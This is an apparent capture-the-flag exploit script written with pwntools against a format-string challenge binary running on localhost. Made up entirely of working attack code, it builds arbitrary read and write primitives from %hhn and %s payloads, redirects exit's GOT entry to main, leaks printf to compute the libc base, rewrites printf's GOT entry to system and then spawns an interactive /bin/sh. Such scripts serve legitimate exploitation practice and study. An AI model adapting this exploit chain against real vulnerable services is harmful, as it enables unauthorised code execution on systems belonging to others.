from pwn import *
context.log_level = 'debug'
r = remote('127.0.0.1', 31337)
elf = ELF("./chal_fsb")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

TIME = 0.8
def aaw(where, what, leng=6):
    total = 0
    payload = b''
    offset = 0
    for i in range(leng):
        c = ((what >> (i * 8)) - offset) % 0x100
        if c == 0:
            c = 0x100
        payload += f"%{c}c%{i+16}$hhn".encode()
        offset += c
        total += c
    payload += f"%{0x1000-total+1}c".encode()
    payload = payload.ljust(0x50, b'\x00')
    for i in range(leng):
        payload += p64(where + i)
    payload = payload.ljust(0x100, b'\x00')
    r.send(payload)
    ret = r.recvrepeat(TIME)
    assert(len(ret) == 0x1000)

def aar(where):
    addrlen = len(p64(where).strip(b'\x00'))
    payload = b''
    # mark --> 2
    # leak --> 6
    # padd --> 4
    payload += f"%8$s||%{0x1000-(2+6+4+addrlen)}c".encode()
    assert len(payload) < 0x10
    payload = payload.ljust(0x10, b'a')
    payload += p64(where)
    r.send(payload)
    ret = r.recvrepeat(TIME)
    assert(len(ret) == 0x1000)
    return ret

aaw(elf.got.exit, elf.sym.main)
ret = aar(elf.got.printf)
leak = u64(ret[1:].split(b'||')[0].ljust(8, b'\x00'))
print(f'leak: {leak:x}')
libc.address = leak - libc.sym.printf
print(f'base: {libc.address:x}')

aaw(elf.got.printf, libc.sym.system)
r.sendline(b"/bin/sh\x00")
r.interactive()
